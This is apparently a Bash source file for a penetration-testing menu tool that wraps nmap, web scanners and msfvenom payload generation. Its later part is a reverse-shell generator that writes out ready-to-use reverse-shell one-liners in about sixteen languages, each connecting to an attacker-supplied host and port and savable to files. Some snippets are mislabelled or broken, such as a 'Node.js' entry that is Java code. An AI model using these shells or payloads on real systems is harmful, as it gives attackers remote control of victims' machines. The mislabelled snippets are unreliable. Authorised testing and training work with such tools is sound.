#!/bin/bash

# Function to create a symlink in /usr/local/bin
create_symlink() {
    script_path=$(realpath "$0")
    symlink_path="/usr/local/bin/enumerannden"

    if [ ! -L "$symlink_path" ]; then
        sudo ln -s "$script_path" "$symlink_path"
	echo -e "${GREEN}[+] Symlink created: You can now run the script from anywhere using 'enumerannden'.${NC}"
    else
    	echo -e "${GREEN}[+] Symlink already exists: You can run the script using 'enumerannden'.${NC}"
    fi
}

# Check if script is run for the first time by checking if the symlink exists
symlink_path="/usr/local/bin/enumerannden"
if [ ! -L "$symlink_path" ]; then
    echo -e "${YELLOW}[+] First time setup: Creating symlink on the PATH for run the script from anywhere using 'enumerannden' ...${NC}"
    create_symlink
fi

# Line edition and moving using arrows
set -o vi

# Save the commands history in a file
HISTFILE=~/.bash_history
HISTSIZE=1000
HISTFILESIZE=2000

# Load the commands history
history -r

# Save the commands history on exit
trap 'history -a' EXIT

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[0;33m'
VIOLET='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
NC='\033[0m' # No Color

# Global Variables
IP=""
OS=""
OPEN_PORTS=""
BASE_DIR=""
ENUM_DIR=""
EXPLOITS_DIR=""
CREATE_FILES=""
# FILE_PATH="/home/kali/Documents/plantilla.txt"
last_output=""
hora=$(date +"%m-%d-%H:%M")

# Function to show the banner
show_banner() {
colors=($GREEN $RED $BLUE $YELLOW $VIOLET $CYAN $WHITE)
    text=(
    "#################################################################################################################################################"
    "#                                                                                                                                               #"
    "#  :::::::::: ::::    ::: :::    ::: ::::    ::::  :::::::::: :::::::::      :::     ::::    ::: ::::    ::: :::::::::  :::::::::: ::::    :::  #"
    "#  :+:        :+:+:   :+: :+:    :+: +:+:+: :+:+:+ :+:        :+:    :+:   :+: :+:   :+:+:   :+: :+:+:   :+: :+:    :+: :+:        :+:+:   :+:  #"
    "#  +:+        :+:+:+  +:+ +:+    +:+ +:+ +:+:+ +:+ +:+        +:+    +:+  +:+   +:+  :+:+:+  +:+ :+:+:+  +:+ +:+    +:+ +:+        :+:+:+  +:+  #"
    "#  +#++:++#   +#+ +:+ +#+ +#+    +:+ +#+  +:+  +#+ +#++:++#   +#++:++#:  +#++:++#++: +#+ +:+ +#+ +#+ +:+ +#+ +#+    +:+ +#++:++#   +#+ +:+ +#+  #"
    "#  +#+        +#+  +#+#+# +#+    +#+ +#+       +#+ +#+        +#+    +#+ +#+     +#+ +#+  +#+#+# +#+  +#+#+# +#+    +#+ +#+        +#+  +#+#+#  #"
    "#  #+#        #+#   #+#+# #+#    #+# #+#       #+# #+#        #+#    #+# #+#     #+# #+#   #+#+# #+#   #+#+# #+#    #+# #+#        #+#   #+#+#  #"
    "#  ########## ###    ####  ########  ###       ### ########## ###    ### ###     ### ###    #### ###    #### #########  ########## ###    ####  #"
    "#                                                                                                                                               #"
    "#                                                                                                                                               #"                                                                                                                                               #"
    "#                                                          Created by: Rannden-SHA                                                              #"
    "#                                                  GitHub: https://github.com/Rannden-SHA/                                                      #"
    "#                                                                                                                                               #"
    "#################################################################################################################################################"

)

for i in {1..20}; do
        clear
        color=${colors[$i % ${#colors[@]}]}
        echo -e "${color}"
        for line in "${text[@]}"; do
            echo "$line"
        done
        echo -e "${NC}"
        sleep 0.1
    done
}

# Function to display the information panel
show_info_panel() {
    echo -e "${VIOLET}"
    echo "========================================================"
    echo -e "${YELLOW}                    Information Panel${NC}"
    echo ""
    echo -e "${YELLOW}My IP:${NC} $(hostname -I | awk '{print $1}') | $(hostname -I | awk '{print $2}')${RED}${NC}"
    echo -e "${YELLOW}My System:${NC} $(uname -s) | $(uname -r) | $(uname -m)${NC}"
    echo -e "${VIOLET}   --------------------------------------------------${NC}"
    echo -e "${YELLOW}Configured IP:${NC}${RED} ${IP}${NC}"
    echo -e "${YELLOW}Host's Operating System:${NC} ${RED}${OS}${NC}"
    echo -e "${YELLOW}Open Ports:${NC}${RED} ${OPEN_PORTS}${NC}"
    echo -e "${YELLOW}Main Directory:${NC}${RED} ${BASE_DIR}${NC}"
    echo -e "${VIOLET}"
    echo "========================================================"
    echo -e "${NC}"
}

# Function to show help
show_help() {
    echo -e "${BLUE}Usage: $0 [options]${NC}"
    echo
    echo "Options:"
    echo -e "  -c [file.conf]\tLoad a configuration file."
    echo -e "  -h\t\t\tShow this help."
    echo
    echo "Description:"
    echo "  This script automates various tasks for penetration testing and reconnaissance."
    echo
    echo "  Options:"
    echo -e "  1) Configure IP:"
    echo "     Set the target host IP and detect its operating system."
    echo
    echo -e "  2) Create directories:"
    echo "     Create the main working directory and its subdirectories."
    echo
    echo -e "  3) NMAP scans:"
    echo "     Perform different types of NMAP scans to enumerate open ports and services."
    echo
    echo -e "  4) Web Tools:"
    echo "     Use tools like WhatWeb, Nikto, and Gobuster for web service enumeration."
    echo
    echo -e "  5) OSINT Tools:"
    echo "     Use tools like theHarvester, Spiderfoot, and FinalRecon for open source intelligence gathering."
    echo
    echo -e "  6) Exploit Tools:"
    echo "     Generate payloads and search for exploits using Searchsploit."
    echo
    echo -e "  7) CheatSheets:"
    echo "     Display various cheat sheets for Linux commands, Windows commands, pivoting, and file transfer techniques."
    echo
    echo -e "  8) Hash Crack:"
    echo "     Detect hash types and crack hashes using Hashcat."
    echo
    echo -e "  9) Reverse Shell Generator:"
    echo "     Generate reverse shell commands for various programming languages and tools."
    echo
    echo -e "  10) Generate Report:"
    echo "     Save the results of the enumeration and scanning to a report file."
    echo
    echo -e "  11) Check and Install Dependencies:"
    echo "     Check for and install necessary dependencies for the script."
    echo
    echo -e "  12) Save & Exit:"
    echo "     Save the current configuration and exit the script."
    echo
    echo "  This script also supports loading a configuration file with the '-c' option to restore a previous session."
    echo
    echo "Example:"
    echo -e "  $0 -c previous_session.conf"
    echo
    echo
    echo -e "${BLUE}[+] Thanks for use ${VIOLET}EnumeRannden${BLUE}!${NC}"
}

# IP setting function
set_ip() {
    show_info_panel
    read -e -p "Enter the Target IP or URL: " IP
    OPEN_PORTS="" # Clear OPEN_PORTS whenever IP is set
    clear
    detect_os
}

# Function to detect the operating system
detect_os() {
    if [ -z "$IP" ]; then
        echo -e "${RED}[-] No IP configured.${NC}"
        return
    fi

    echo -e "${BLUE}[+] Pinging to ${IP}${NC}"
    TTL=$(ping -c 1 $IP | grep 'ttl' | awk -F'ttl=' '{print $2}' | awk '{print $1}')

    if [ ! -z "$TTL" ]; then
        if [ "$TTL" -le 70 ]; then
            OS="Linux --> TTL=$TTL"
        else
            OS="Windows --> TTL=$TTL"
        fi
    else
        OS="Unknown"
        echo -e "${RED}[-] TTL could not be determined.${NC}"
    fi
}

# Function to create directories
create_directories() {

    show_info_panel
    read -e -p "Enter the name of the main directory: " BASE_DIR
    ENUM_DIR="$BASE_DIR/enum"
    EXPLOITS_DIR="$ENUM_DIR/exploits"
    clear

    echo -e "${BLUE}[+] Creating main directory: ${BASE_DIR}${NC}"
    mkdir -p "$BASE_DIR"

    echo -e "${BLUE}[+] Creating subdirectories: enum, loot, privesc, exploits, osint and tools${NC}"
    mkdir -p "$BASE_DIR/enum" "$BASE_DIR/loot" "$BASE_DIR/privesc" "$BASE_DIR/exploits" "$BASE_DIR/osint" "$BASE_DIR/tools"
    # Copy file
    #if [ -f "$FILE_PATH" ]; then
       #echo -e "${BLUE}[+] Copying ${FILE_PATH} to ${ENUM_DIR}${NC}"
       #cp "$FILE_PATH" "$ENUM_DIR"
    #else
        #echo -e "${RED}[-] The file ${FILE_PATH} doesn't exists.${NC}"
    #fi
}

# Function to scan ports with NMAP
scan_nmap() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select the nmap scan type:${NC}"
        echo -e "1) AutoEnumeration"
        echo -e "2) Simple port scanning"
        echo -e "3) Scanning with port version"
        echo -e "4) Custom nmap scan"
        echo -e "5) Back"
        read -e -p "Option: " nmap_option

        clear
        case $nmap_option in
            1)
                echo -e "${BLUE}[+] Performing autonmap scan.${NC}"
                nmap -p- --open --min-rate 5000 -Pn $IP -oN "$ENUM_DIR/nmap_open_ports.txt"
                update_ports
                echo -e "${BLUE}[+] Checking for open HTTP/HTTPS ports in nmap scan results.${NC}"
                open_http_ports=$(grep -E '^[0-9]+/(tcp|udp) +open +(http|https)' "$ENUM_DIR/nmap_open_ports.txt" | awk '{print $1}' | awk -F'/' '{print $1}')

                if [ ! -z "$open_http_ports" ]; then
                    last_output=""
                    for port in $open_http_ports; do
                        if [ "$port" == "443" ] || [ "$port" == "https" ]; then
                            echo -e "${GREEN}[+] Performing Whatweb scan on https://${IP}:${port}${NC}"
                            whatweb https://${IP}:${port} > "$ENUM_DIR/whatweb_$port.txt"
                        else
                            echo -e "${GREEN}[+] Performing Whatweb scan on http://${IP}:${port}${NC}"
                            whatweb http://${IP}:${port} > "$ENUM_DIR/whatweb_$port.txt"
                        fi
                        last_output+=$(cat "$ENUM_DIR/whatweb_$port.txt")
                        cat "$ENUM_DIR/whatweb_$port.txt"
                        last_output+=$'\n'
                        echo -e "${GREEN}[+] Performing Nikto scan on ${IP}:${port}${NC}"
                        nikto -h $IP:$port | tee "$ENUM_DIR/nikto_$port.txt"
                        last_output+=$(cat "$ENUM_DIR/nikto_$port.txt")
                        cat "$ENUM_DIR/nikto_$port.txt"
                        last_output+=$'\n'
                    done
                else
                    last_output="${RED}[+] No open HTTP/HTTPS ports found.${NC}"
                fi
                save_results
                ;;
            2)
                echo -e "${BLUE}[+] Performing port scanning with nmap.${NC}"
                nmap -p- --open --min-rate 5000 -Pn $IP -oN "$ENUM_DIR/nmap_open_ports.txt"
                update_ports
                last_output=$(cat "$ENUM_DIR/nmap_open_ports.txt")
                save_results
                ;;
            3)
                echo -e "${BLUE}[+] Select the range of ports (1-1000), specific ports separated by commas (80,443,445) or 'all' to scan all ports:${NC}"
                read -e -p "Ports: " port_range
                if [ "$port_range" == "all" ]; then
                    specific_ports="-p-"
                else
                    specific_ports="-p $port_range"
                fi
                echo -e "${BLUE}[+] Performing port version scanning with nmap.${NC}"
                nmap $specific_ports -sCV --open -T4 -Pn $IP -oN "$ENUM_DIR/nmap_info_ports.txt"
                update_ports
                last_output=$(cat "$ENUM_DIR/nmap_info_ports.txt")
                save_results
                ;;
            4)
                echo -e "${BLUE}[+] Custom Scan Settings:${NC}"
                read -e -p "Enter the ports to scan (example: 1-100 o 80,443 o todos): " ports
                read -e -p "You want to detect the version of the service -sV (y/n): " service_version
                read -e -p "You want to perform a script scan -sC (y/n): " script_scan
                read -e -p "You want to perform an aggressive scan -A (y/n): " aggressive_scan
                read -e -p "You want to perform a UDP scan -sU (y/n): " udp_scan
                read -e -p "Enter the intensity level -T (0-5, default is 3): " intensity
                read -e -p "You want to scan without ping -Pn (y/n): " no_ping
                read -e -p "You want to scan behind firewall -f (y/n): " firewall_scan
                read -e -p "You want to perform a quick scan -F (y/n): " fast_scan

                custom_options=""
                if [ "$ports" == "all" ]; then
                    custom_options="-p-"
                else
                    custom_options="-p $ports"
                fi
                if [ "$service_version" == "y" ]; then
                    custom_options="$custom_options -sV"
                fi
                if [ "$script_scan" == "y" ]; then
                    custom_options="$custom_options -sC"
                fi
                if [ "$aggressive_scan" == "y" ]; then
                    custom_options="$custom_options -A"
                fi
                if [ "$udp_scan" == "y" ]; then
                    custom_options="$custom_options -sU"
                fi
                if [ -n "$intensity" ]; then
                    custom_options="$custom_options -T$intensity"
                fi
                if [ "$no_ping" == "y" ]; then
                    custom_options="$custom_options -Pn"
                fi
                if [ "$firewall_scan" == "y" ]; then
                    custom_options="$custom_options -f"
                fi
                if [ "$fast_scan" == "y" ]; then
                    custom_options="$custom_options -F"
                fi

                echo -e "${BLUE}[+] Performing custom port scanning with nmap.${NC}"
                nmap $custom_options $IP --open -oN "$ENUM_DIR/nmap_custom_scan.txt"
                update_ports
                last_output=$(cat "$ENUM_DIR/nmap_custom_scan.txt")
                save_results
                ;;
            5)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
    done
}

# Function to update open ports
update_ports() {
    if [ -f "$ENUM_DIR/nmap_open_ports.txt" ]; then
        OPEN_PORTS=$(grep -E '^[0-9]+/(tcp|udp) +open' "$ENUM_DIR/nmap_open_ports.txt" | awk '{print $1}' | awk -F'/' '{print $1}' | tr '\n' ' ')
    elif [ -f "$ENUM_DIR/nmap_info_ports.txt" ]; then
        OPEN_PORTS=$(grep -E '^[0-9]+/(tcp|udp) +open' "$ENUM_DIR/nmap_info_ports.txt" | awk '{print $1}' | awk -F'/' '{print $1}' | tr '\n' ' ')
    elif [ -f "$ENUM_DIR/nmap_custom_scan.txt" ]; then
        OPEN_PORTS=$(grep -E '^[0-9]+/(tcp|udp) +open' "$ENUM_DIR/nmap_custom_scan.txt" | awk '{print $1}' | awk -F'/' '{print $1}' | tr '\n' ' ')
    else
        OPEN_PORTS=""
        echo -e "${RED}[-] No nmap scan files found with open ports.${NC}"
    fi
}

# Function to save results in configuration file
save_results() {
    if [ -z "$BASE_DIR" ]; then
        echo -e "${YELLOW}[!!] Thanks for use ${VIOLET}EnumeRannden${YELLOW} [!!]${NC}"
        return 1
    fi

    conf_file="${BASE_DIR}/${BASE_DIR##*/}.conf"
    {
        echo "IP=${IP}"
        echo "OS=${OS}"
        echo "OPEN_PORTS=${OPEN_PORTS}"
        echo "BASE_DIR=${BASE_DIR}"
    } > "$conf_file"
    echo -e "${BLUE}[+] Results saved in ${conf_file}${NC}"
    echo -e "${YELLOW}[!!] Thanks for use ${VIOLET}EnumeRannden${YELLOW} [!!]${NC}"
}

# Function to save results in a report
save_report() {
    if [ -z "$BASE_DIR" ]; then
        echo -e "${YELLOW}[!!] Thanks for using ${VIOLET}EnumeRannden${YELLOW} [!!]${NC}"
        return 1
    fi

    report_file="${BASE_DIR}/report_${BASE_DIR##*/}.txt"
    pdf_report_file="${BASE_DIR}/report_${BASE_DIR##*/}.pdf"
    html_report="/tmp/report.html"
    cover_image="path/to/your/cover_image.jpg"  # Update this path to your cover image

    # Save TXT Report
    {
        echo -e "${CYAN}"
        echo "                                 ========================================================"
        echo "                                                     Information Panel"
        echo "                                 ========================================================"
        echo -e "${NC}"
        echo -e "${BLUE}                                   IP:${NC} ${RED}${IP}${NC}"
        echo -e "${BLUE}                                   Host's Operating System:${NC} ${RED}${OS}${NC}"
        echo -e "${BLUE}                                   Open Ports:${NC} ${RED}${OPEN_PORTS}${NC}"
        echo -e "${BLUE}                                   Main Directory:${NC} ${RED}${BASE_DIR}${NC}"
        echo -e "${CYAN}"
        echo "                                 ========================================================"
        echo -e "${NC}\n\n"
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"
        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                      NMAP Results"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        for file in "${ENUM_DIR}/nmap_"*.txt; do
            [ -e "$file" ] && echo -e "${YELLOW}File: ${file}${NC}\n$(cat "$file")\n"
        done
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"

        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                     WhatWeb Results"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        for file in "${ENUM_DIR}/whatweb_"*.txt; do
            [ -e "$file" ] && echo -e "${YELLOW}File: ${file}${NC}\n$(cat "$file")\n"
        done
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"

        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                     Nikto Results"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        for file in "${ENUM_DIR}/nikto_"*.txt; do
            [ -e "$file" ] && echo -e "${YELLOW}File: ${file}${NC}\n$(cat "$file")\n"
        done
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"

        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                    Gobuster Results"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        [ -e "${ENUM_DIR}/gobuster.txt" ] && echo -e "${YELLOW}File: ${ENUM_DIR}/gobuster.txt${NC}\n$(cat "${ENUM_DIR}/gobuster.txt")\n"
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"

        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                  Hash Cracking Results"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        for file in "${BASE_DIR}/loot/cracked_"*.txt; do
            [ -e "$file" ] && echo -e "${YELLOW}File: ${file}${NC}\n$(cat "$file")\n"
        done
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"

        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                   Payloads Generated"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        for file in "${BASE_DIR}/exploits/"*; do
            [ -e "$file" ] && echo -e "${YELLOW}File: ${file}${NC}\n"
        done
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"

        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                     OSINT Results"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        for file in "${BASE_DIR}/osint/"*; do
            [ -e "$file" ] && echo -e "${YELLOW}File: ${file}${NC}\n$(cat "$file")\n"
        done
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"
    } > "$report_file"

    # Save HTML Report with styles and emojis
    {
        echo "<html>"
        echo "<head>"
        echo "<title>EnumeRannden Report</title>"
        echo "<style>"
        echo "body { font-family: Arial, sans-serif; margin: 40px; }"
        echo "h1 { color: #4CAF50; text-align: center; }"
        echo "h2 { color: #2196F3; }"
        echo "h3 { color: #FFC107; }"
        echo "p { font-size: 14px; }"
        echo "pre { background: #f4f4f4; padding: 10px; border-radius: 5px; }"
        echo ".info-panel { background: #e3f2fd; padding: 20px; border-radius: 5px; margin-bottom: 20px; }"
        echo ".info-panel p { margin: 5px 0; }"
        echo ".cover-image { width: 100%; height: auto; margin-bottom: 20px; }"
        echo "</style>"
        echo "</head>"
        echo "<body>"
        echo "<img src='https://github.com/Rannden-SHA/EnumeRannden/blob/main/Images/banner.png?raw=true' class='cover-image' alt='Cover Image'>" # Link to the image
        echo "<h1>EnumeRannden Report</h1>"
        echo "<div class='info-panel'>"
        echo "<h2>Information Panel</h2>"
        echo "<p><strong>IP:</strong> ${IP}</p>"
        echo "<p><strong>Host's Operating System:</strong> ${OS}</p>"
        echo "<p><strong>Open Ports:</strong> ${OPEN_PORTS}</p>"
        echo "<p><strong>Main Directory:</strong> ${BASE_DIR}</p>"
        echo "</div>"

        echo "<h2>NMAP Results</h2>"
        for file in "${ENUM_DIR}/nmap_"*.txt; do
            [ -e "$file" ] && echo "<h3>File: ${file}</h3><pre>$(cat "$file")</pre>"
        done

        echo "<h2>WhatWeb Results</h2>"
        for file in "${ENUM_DIR}/whatweb_"*.txt; do
            [ -e "$file" ] && echo "<h3>File: ${file}</h3><pre>$(cat "$file")</pre>"
        done

        echo "<h2>Nikto Results</h2>"
        for file in "${ENUM_DIR}/nikto_"*.txt; do
            [ -e "$file" ] && echo "<h3>File: ${file}</h3><pre>$(cat "$file")</pre>"
        done

        echo "<h2>Gobuster Results</h2>"
        [ -e "${ENUM_DIR}/gobuster.txt" ] && echo "<h3>File: ${ENUM_DIR}/gobuster.txt</h3><pre>$(cat "${ENUM_DIR}/gobuster.txt")</pre>"

        echo "<h2>Hash Cracking Results</h2>"
        for file in "${BASE_DIR}/loot/cracked_"*.txt; do
            [ -e "$file" ] && echo "<h3>File: ${file}</h3><pre>$(cat "$file")</pre>"
        done

        echo "<h2>Payloads Generated</h2>"
        for file in "${BASE_DIR}/exploits/"*; do
            [ -e "$file" ] && echo "<h3>File: ${file}</h3>"
        done

        echo "<h2>OSINT Results</h2>"
        for file in "${BASE_DIR}/osint/"*; do
            [ -e "$file" ] && echo "<h3>File: ${file}</h3><pre>$(cat "$file")</pre>"
        done

        echo "</body>"
        echo "</html>"
    } > "$html_report"

    # Convert HTML to PDF
    wkhtmltopdf "$html_report" "$pdf_report_file"

    # Clean up the temporary HTML file
    rm "$html_report"

    echo -e "${BLUE}[+] Report saved in ${report_file} and ${pdf_report_file}${NC}"
}

# Function to load results from configuration file
load_results() {
    if [ -f "$1" ]; then
        while IFS='=' read -r key value; do
            case "$key" in
                'IP') IP="$value" ;;
                'OS') OS="$value" ;;
                'OPEN_PORTS') OPEN_PORTS="$value" ;;
                'BASE_DIR') BASE_DIR="$value" ;;
            esac
        done < "$1"
        echo -e "${BLUE}[+] Results uploaded from $1${NC}"
        ENUM_DIR="$BASE_DIR/enum"
    else
        echo -e "${RED}[-] File $1 does not exist.${NC}"
    fi
}

# Function to generate payloads using msfvenom
generate_payloads() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select an option to generate payloads:${NC}"
        echo -e "1) windows/meterpreter/reverse_tcp"
        echo -e "2) windows/x64/meterpreter/reverse_tcp"
        echo -e "3) linux/x86/meterpreter/reverse_tcp"
        echo -e "4) linux/x64/meterpreter/reverse_tcp"
        echo -e "5) osx/x86/shell_reverse_tcp"
        echo -e "6) osx/x64/shell_reverse_tcp"
        echo -e "7) android/meterpreter/reverse_tcp"
        echo -e "8) java/jsp_shell_reverse_tcp"
        echo -e "9) php/meterpreter_reverse_tcp"
        echo -e "10) python/meterpreter_reverse_tcp"
        echo -e "11) Customize payload"
        echo -e "12) Back"
        read -e -p "Option: " payload_option

        clear
        case $payload_option in
            1)
                payload="windows/meterpreter/reverse_tcp"
                format="exe"
                ;;
            2)
                payload="windows/x64/meterpreter/reverse_tcp"
                format="exe"
                ;;
            3)
                payload="linux/x86/meterpreter/reverse_tcp"
                format="elf"
                ;;
            4)
                payload="linux/x64/meterpreter/reverse_tcp"
                format="elf"
                ;;
            5)
                payload="osx/x86/shell_reverse_tcp"
                format="macho"
                ;;
            6)
                payload="osx/x64/shell_reverse_tcp"
                format="macho"
                ;;
            7)
                payload="android/meterpreter/reverse_tcp"
                format="apk"
                ;;
            8)
                payload="java/jsp_shell_reverse_tcp"
                format="jsp"
                ;;
            9)
                payload="php/meterpreter_reverse_tcp"
                format="php"
                ;;
            10)
                payload="python/meterpreter_reverse_tcp"
                format="py"
                ;;
            11)
                read -e -p "Enter the custom payload: " payload
                read -e -p "Enter the custom format: " format
                ;;
            12)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                continue
                ;;
        esac

        if [ -n "$payload" ]; then
            show_info_panel
            read -e -p "Enter the IP address for the payload (LHOST): " lhost
            read -e -p "Enter the port for the payload (LPORT): " lport
            read -e -p "Enter the name of the file to save the payload (without extension): " output_file

            output_file="${output_file}.${format}"
            clear
            msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -o "${BASE_DIR}/exploits/$output_file"
            echo -e "${BLUE}[+] Payload generated and saved in ${BASE_DIR}/exploits/${output_file}${NC}"
        fi
    done
}

# Function to generate reverse shells
generate_reverse_shell() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select a Reverse Shell Option:${NC}"
        echo -e "1) Bash"
        echo -e "2) Perl"
        echo -e "3) Python"
        echo -e "4) PHP"
        echo -e "5) Ruby"
        echo -e "6) Netcat"
        echo -e "7) Socat"
        echo -e "8) PowerShell"
        echo -e "9) C#"
        echo -e "10) Java"
        echo -e "11) Golang"
        echo -e "12) Awk"
        echo -e "13) Telnet"
        echo -e "14) Node.js"
        echo -e "15) Tclsh"
        echo -e "16) Haskell"
        echo -e "17) Back to Main Menu"
        read -e -p "Option: " shell_option

        case $shell_option in
            1)
                shell_code='bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
                ;;
            2)
                shell_code='perl -e "use Socket;$i=\$LHOST;$p=\$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"'
                ;;
            3)
                shell_code='python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",int(\"$LPORT\")));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"'
                ;;
            4)
                shell_code='php -r "$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");"'
                ;;
            5)
                shell_code='ruby -rsocket -e "f=TCPSocket.open(\"$LHOST\",$LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)"'
                ;;
            6)
                shell_code='nc -e /bin/sh $LHOST $LPORT'
                ;;
            7)
                shell_code='socat TCP:$LHOST:$LPORT EXEC:/bin/sh'
                ;;
            8)
                shell_code='powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$LHOST",$LPORT);[byte[]]$buffer=0..65535|%{0};while(($i=$stream.Read($buffer,0,$buffer.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}'
                ;;
            9)
                shell_code='using System;using System.IO;using System.Net.Sockets;class Program{static void Main(string[] args){using(TcpClient client=new TcpClient("$LHOST",$LPORT)){using(Stream stream=client.GetStream()){using(StreamReader rdr=new StreamReader(stream)){using(StreamWriter wtr=new StreamWriter(stream)){StringBuilder strInput=new StringBuilder();char[] buff=new char[1024];int readBytes=0;while(true){readBytes=rdr.Read(buff,0,buff.Length);strInput.Append(buff,0,readBytes);if(strInput.ToString().EndsWith("EOF")){strInput.Remove(strInput.Length-3,3);break;}}}}}}}'
                ;;
            10)
                shell_code='r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor()'
                ;;
            11)
                shell_code='echo "package main\nimport(\n\"net\"\n\"os/exec\"\n)\nfunc main(){\nc,_:=net.Dial(\"tcp\",\"$LHOST:$LPORT\")\ncmd:=exec.Command(\"/bin/sh\")\ncmd.Stdin=c\ncmd.Stdout=c\ncmd.Stderr=c\ncmd.Run()\n}" > /tmp/t.go && go run /tmp/t.go'
                ;;
            12)
                shell_code='awk "BEGIN {s = \"/inet/tcp/0/$LHOST/$LPORT\"; while (1) { printf \\"sh <&3 >&3 2>&3\\" |& s; s |& getline c; if (c) { while (c) { print c |& s; s |& getline c } close(s); } } }"'
                ;;
            13)
                shell_code='TF=$(mktemp -u);mkfifo $TF && telnet $LHOST $LPORT 0<$TF | /bin/sh 1>$TF'
                ;;
            14)
                shell_code='String host="$LHOST";int port=$LPORT;String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'
                ;;
            15)
                shell_code='tclsh <<EOF\nset s [socket $LHOST $LPORT]\nwhile {1} {\n  set line [gets stdin]\n  if {[catch {eval $line} res]} {\n    puts $res\n    flush stdout\n  }\n}\nEOF'
                ;;
            16)
                shell_code='import Network.Socket\nimport System.IO\nimport System.Process\nmain = withSocketsDo $ do\n    h <- connectTo "$LHOST" (PortNumber $LPORT)\n    (Just hin, Just hout, Just herr, p) <- createProcess (proc "/bin/sh" ["-i"]){\n        std_in  = UseHandle h,\n        std_out = UseHandle h,\n        std_err = UseHandle h }\n    waitForProcess p\n'
                ;;
            17)
		        clear
                break
                ;;
            *)
                clear
                echo -e "${RED}[-] Invalid option.${NC}"
                continue
                ;;
        esac

        if [ -n "$shell_code" ]; then
            read -e -p "Enter the IP address (LHOST): " lhost
            read -e -p "Enter the port (LPORT): " lport
            
            plain_shell_code=${shell_code//\$LHOST/$lhost}
            plain_shell_code=${plain_shell_code//\$LPORT/$lport}

            shell_code=${shell_code//\$LHOST/${VIOLET}$lhost${YELLOW}}
            shell_code=${shell_code//\$LPORT/${VIOLET}$lport${YELLOW}}

            echo -e "${GREEN}[+] Reverse Shell:${NC}"
            echo -e "${YELLOW}${shell_code}${NC}"
            
            read -e -p "Do you want to save the reverse shell to a file? (y/n): " save_option
            if [ "$save_option" == "y" ]; then
                read -e -p "Enter the file name (without extension): " output_file
                case $shell_option in
                    1)
                        extension="sh"
                        ;;
                    2)
                        extension="pl"
                        ;;
                    3)
                        extension="py"
                        ;;
                    4)
                        extension="php"
                        ;;
                    5)
                        extension="rb"
                        ;;
                    6)
                        extension="nc"
                        ;;
                    7)
                        extension="sc"
                        ;;
                    8)
                        extension="ps1"
                        ;;
                    9)
                        extension="cs"
                        ;;
                    10)
                        extension="java"
                        ;;
                    11)
                        extension="go"
                        ;;
                    12)
                        extension="awk"
                        ;;
                    13)
                        extension="txt"
                        ;;
                    14)
                        extension="js"
                        ;;
                    15)
                        extension="tcl"
                        ;;
                    16)
                        extension="hs"
                        ;;
                    *)
                        extension="txt"
                        ;;
                esac
                echo "$plain_shell_code" > "${BASE_DIR}/exploits/${output_file}.${extension}"
                echo -e "${GREEN}[+] Reverse shell saved in ${BASE_DIR}/exploits/${output_file}.${extension}${NC}"
